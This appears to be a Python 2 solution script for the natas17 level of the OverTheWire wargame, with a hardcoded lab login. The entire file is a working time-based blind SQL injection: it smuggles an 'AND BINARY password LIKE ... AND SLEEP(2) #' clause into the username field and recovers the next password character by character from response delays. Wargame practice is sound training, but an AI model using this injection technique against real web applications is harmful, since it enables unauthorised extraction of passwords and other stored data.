import requests
import re
from string import * 
from time import *

usn = 'natas17'
url = 'http://%s.natas.labs.overthewire.org/' % usn
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
login = (usn, password)

alphaNum = lowercase + uppercase + digits
confirmedPass = list()
session = requests.Session()

#sessionGet = session.get(url, auth=login )
#pageContent = sessionGet.text 

#print pageContent


#########################################
while (len(confirmedPass) < 32):
  for ch in alphaNum:
    start_time = time()
    #print "Attempting: ", "".join(confirmedPass) + ch
    sessionPost = session.post(url, data = {"username" : 'natas18" AND BINARY password LIKE "' + "".join(confirmedPass) + ch +'%" AND SLEEP(2) # '}, auth = login)
    pageContent = sessionPost.text
    end_time = time()
    duration = end_time - start_time
   

    if(duration > 2):
      confirmedPass.append(ch)
      print("Password = " + "".join(confirmedPass))
      break;
    